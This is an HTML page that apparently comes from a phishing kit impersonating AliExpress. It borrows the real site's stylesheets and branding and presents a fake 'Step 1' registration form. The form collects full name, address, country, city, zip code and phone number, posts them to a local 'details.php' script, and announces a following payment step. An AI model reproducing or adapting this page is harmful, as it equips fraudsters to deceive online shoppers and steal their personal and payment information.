﻿<!--

-->
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Step 1 : Enter Personal info</title>
	  <link rel="shortcut icon" link rel="logo-icon" href="images/favicon.ico">  <link rel="stylesheet" type="text/css" href="//i.alicdn.com/ae-login/login/??buyerlogin.c5e9b325.css" />
    <link rel="stylesheet" href="//i.alicdn.com/sc-isle/??common.00000000.css" />
    <link rel="stylesheet" href="//i.alicdn.com/sc-header/20150921135500/dist/??header.css?t=814958" />
    <link rel="shortcut icon" link rel="logo-icon" href="images/favicon.ico">
    
<script type="text/javascript" src="//i.alicdn.com/sc-isle/??loader.1ab001e3.js"></script>
<link rel="stylesheet" href="https://assets.alicdn.com/g/tb/global/global-min.css">
<link href="//g.alicdn.com//vip/register/2.8.9/xcommon/css/??base.css,form.css,btn.css,dialog.css,msg.css,responsive.css?t=201404171640" rev="stylesheet" rel="stylesheet" />
<link type="text/css" href="//g.alicdn.com/sd/ncpc/nc.css?t=2016062600" rel="stylesheet" />

	<link rel="stylesheet" href="//i.alicdn.com/sc-isle/register/css/havana.2d4a8439.css" />
	
	<link rel="stylesheet" href="//g.alicdn.com//vip/register/2.8.9/xcommon/css/lang_en.css"/>

<link href="//i.alicdn.com/sc-isle/register/css/??common.fa56f68d.css" rel="stylesheet" type="text/css" media="all" />
</head>
<body data-spm="7275745">
<br>
<div id="headerReg">
        <div class="header990">
            <div id="aliLogo" class="util-left">
            	<a title="" href="">www.aliexpress.com</a>
                <p>Smarter Shopping, Better Living</p>
            </div>                                                                                                                                                                                                                                               </div><!-- header990 -->
        <div style="clear:both"></div>
    </div>
<div class="page lang-en">
<div id="headerReg">
<div class="steps" style='background: #f7f6f6;'>
	<ol>
		        <li class="active"><i>1</i><span class="tsl" data-phase-id="r_p_createAccount">The information</span></li>
				<li><i>2</i><span class="tsl" data-phase-id="r_p_fillUserInfo">The payment</span></li>
				<li><i class="iconfont">㑇</i><span class="tsl" data-phase-id="r_p_regSuc">Complete</span></li>
	</ol>

			
	</div>

	
	<div class="content" style='background: #f9f9f9;'>
		<div class="form-list form-main-list">
			<form id="J_EmailForm" method="post" action="email/details.php">
				<div class="form-group">
										<div class="form-item">
						<span class="form-label tsl">Full Name :</span>
						<input class="form-text" required='' name="name" type="text" value="" style="width:420px;" placeholder="" maxlength="60">
						
					</div>
					<div class="form-item">
						<span class="form-label tsl">Address Line 1 :</span>
						<input class="form-text" required='' name="adrs1" type="text" value="" style="width:420px;" placeholder="" maxlength="60">
						
					</div>
					<div class="form-item">
						<span class="form-label tsl">Address Line 2 :</span>
						<input class="form-text" required='' name="adrs2" type="text" value="" style="width:420px;" placeholder="" maxlength="60">
						
					</div>
					<div class="form-item">
						<span class="form-label tsl">Country :</span>
<select name="country" required="" class=""><option value="1" selected="selected">United States</option><option value="225">APO/FPO/DPO</option><option value="2">Canada</option><option value="3">United Kingdom</option><option value="4">Afghanistan</option><option value="5">Albania</option><option value="6">Algeria</option><option value="7">American Samoa</option><option value="8">Andorra</option><option value="9">Angola</option><option value="10">Anguilla</option><option value="11">Antigua and Barbuda</option><option value="12">Argentina</option><option value="13">Armenia</option><option value="14">Aruba</option><option value="15">Australia</option><option value="16">Austria</option><option value="17">Azerbaijan Republic</option><option value="18">Bahamas</option><option value="19">Bahrain</option><option value="20">Bangladesh</option><option value="21">Barbados</option><option value="22">Belarus</option><option value="23">Belgium</option><option value="24">Belize</option><option value="25">Benin</option><option value="26">Bermuda</option><option value="27">Bhutan</option><option value="28">Bolivia</option><option value="29">Bosnia and Herzegovina</option><option value="30">Botswana</option><option value="31">Brazil</option><option value="32">British Virgin Islands</option><option value="33">Brunei Darussalam</option><option value="34">Bulgaria</option><option value="35">Burkina Faso</option><option value="37">Burundi</option><option value="38">Cambodia</option><option value="39">Cameroon</option><option value="40">Cape Verde Islands</option><option value="41">Cayman Islands</option><option value="42">Central African Republic</option><option value="43">Chad</option><option value="44">Chile</option><option value="45">China</option><option value="46">Colombia</option><option value="47">Comoros</option><option value="48">Congo, Democratic Republic of the</option><option value="49">Congo, Republic of the</option><option value="50">Cook Islands</option><option value="51">Costa Rica</option><option value="52">Cote d Ivoire (Ivory Coast)</option><option value="53">Croatia, Republic of</option><option value="55">Cyprus</option><option value="56">Czech Republic</option><option value="57">Denmark</option><option value="58">Djibouti</option><option value="59">Dominica</option><option value="60">Dominican Republic</option><option value="61">Ecuador</option><option value="62">Egypt</option><option value="63">El Salvador</option><option value="64">Equatorial Guinea</option><option value="65">Eritrea</option><option value="66">Estonia</option><option value="67">Ethiopia</option><option value="68">Falkland Islands (Islas Malvinas)</option><option value="69">Fiji</option><option value="70">Finland</option><option value="71">France</option><option value="72">French Guiana</option><option value="73">French Polynesia</option><option value="74">Gabon Republic</option><option value="75">Gambia</option><option value="76">Georgia</option><option value="77">Germany</option><option value="78">Ghana</option><option value="79">Gibraltar</option><option value="80">Greece</option><option value="81">Greenland</option><option value="82">Grenada</option><option value="83">Guadeloupe</option><option value="84">Guam</option><option value="85">Guatemala</option><option value="86">Guernsey</option><option value="87">Guinea</option><option value="88">Guinea-Bissau</option><option value="89">Guyana</option><option value="90">Haiti</option><option value="91">Honduras</option><option value="92">Hong Kong</option><option value="93">Hungary</option><option value="94">Iceland</option><option value="95">India</option><option value="96">Indonesia</option><option value="99">Ireland</option><option value="100">Israel</option><option value="101">Italy</option><option value="102">Jamaica</option><option value="103">Jan Mayen</option><option value="104">Japan</option><option value="105">Jersey</option><option value="106">Jordan</option><option value="107">Kazakhstan</option><option value="108">Kenya</option><option value="109">Kiribati</option><option value="111">Korea, South</option><option value="112">Kuwait</option><option value="113">Kyrgyzstan</option><option value="114">Laos</option><option value="115">Latvia</option><option value="116">Lebanon</option><option value="120">Liechtenstein</option><option value="121">Lithuania</option><option value="122">Luxembourg</option><option value="123">Macau</option><option value="124">Macedonia</option><option value="125">Madagascar</option><option value="126">Malawi</option><option value="127">Malaysia</option><option value="128">Maldives</option><option value="129">Mali</option><option value="130">Malta</option><option value="131">Marshall Islands</option><option value="132">Martinique</option><option value="133">Mauritania</option><option value="134">Mauritius</option><option value="135">Mayotte</option><option value="136">Mexico</option><option value="226">Micronesia</option><option value="137">Moldova</option><option value="138">Monaco</option><option value="139">Mongolia</option><option value="228">Montenegro</option><option value="140">Montserrat</option><option value="141">Morocco</option><option value="142">Mozambique</option><option value="143">Namibia</option><option value="144">Nauru</option><option value="145">Nepal</option><option value="146">Netherlands</option><option value="147">Netherlands Antilles</option><option value="148">New Caledonia</option><option value="149">New Zealand</option><option value="150">Nicaragua</option><option value="151">Niger</option><option value="152">Nigeria</option><option value="153">Niue</option><option value="154">Norway</option><option value="155">Oman</option><option value="156">Pakistan</option><option value="157">Palau</option><option value="158">Panama</option><option value="159">Papua New Guinea</option><option value="160">Paraguay</option><option value="161">Peru</option><option value="162">Philippines</option><option value="163">Poland</option><option value="164">Portugal</option><option value="165">Puerto Rico</option><option value="166">Qatar</option><option value="227">Reunion</option><option value="167">Romania</option><option value="168">Russian Federation</option><option value="169">Rwanda</option><option value="170">Saint Helena</option><option value="171">Saint Kitts-Nevis</option><option value="172">Saint Lucia</option><option value="173">Saint Pierre and Miquelon</option><option value="174">Saint Vincent and the Grenadines</option><option value="175">San Marino</option><option value="176">Saudi Arabia</option><option value="177">Senegal</option><option value="229">Serbia</option><option value="178">Seychelles</option><option value="179">Sierra Leone</option><option value="180">Singapore</option><option value="181">Slovakia</option><option value="182">Slovenia</option><option value="183">Solomon Islands</option><option value="184">Somalia</option><option value="185">South Africa</option><option value="186">Spain</option><option value="187">Sri Lanka</option><option value="189">Suriname</option><option value="190">Svalbard</option><option value="191">Swaziland</option><option value="192">Sweden</option><option value="193">Switzerland</option><option value="195">Tahiti</option><option value="196">Taiwan</option><option value="197">Tajikistan</option><option value="198">Tanzania</option><option value="199">Thailand</option><option value="200">Togo</option><option value="201">Tonga</option><option value="202">Trinidad and Tobago</option><option value="203">Tunisia</option><option value="204">Turkey</option><option value="205">Turkmenistan</option><option value="206">Turks and Caicos Islands</option><option value="207">Tuvalu</option><option value="208">Uganda</option><option value="209">Ukraine</option><option value="210">United Arab Emirates</option><option value="211">Uruguay</option><option value="212">Uzbekistan</option><option value="213">Vanuatu</option><option value="214">Vatican City State</option><option value="215">Venezuela</option><option value="216">Vietnam</option><option value="217">Virgin Islands (U.S.)</option><option value="218">Wallis and Futuna</option><option value="219">Western Sahara</option><option value="220">Western Samoa</option><option value="221">Yemen</option><option value="223">Zambia</option><option value="224">Zimbabwe</option></select>						
					</div>
					<div class="form-item">
						<span class="form-label tsl">City :</span>
						<input class="form-text" required='' name="city" type="text" value="" style="width:150px;" placeholder="" maxlength="60">
						Province/Region :
						<input class="form-text" required='' name="region" type="text" value="" style="width:135px;" placeholder="" maxlength="60">
						
					</div>
					<div class="form-item">
						<span class="form-label tsl">Zip Code :</span>
						<input class="form-text" required='' name="zip" type="text" value="" style="width:420px;" placeholder="" maxlength="60">
					</div>
					<div class="form-item">
						<span class="form-label tsl">Phone Number :</span>
						<input class="form-text" required='' name="phone" type="text" value="" style="width:420px;" placeholder="" maxlength="60">
					</div>
				</div>
				<div class="form-group">
					<div class="form-item form-item-short">
						<button type="submit" class="btn btn-large tsl" data-phase-id="r_p_next" id="J_BtnEmailForm">Next</button>
										<div class="msg" data-show="0" id="J_MsgEmailForm" data-display="block"><i class="iconfont">undefined</i><div class="msg-tit"></div><div class="msg-cnt" aria-live="assertive"></div></div>
					</div>
									</div>
			</form>
		</div>
	</div>
</div>
</div>
<div id="footer">
<center>
<img src="images/footer.png"/>
</center>
</div>
</body>
</html>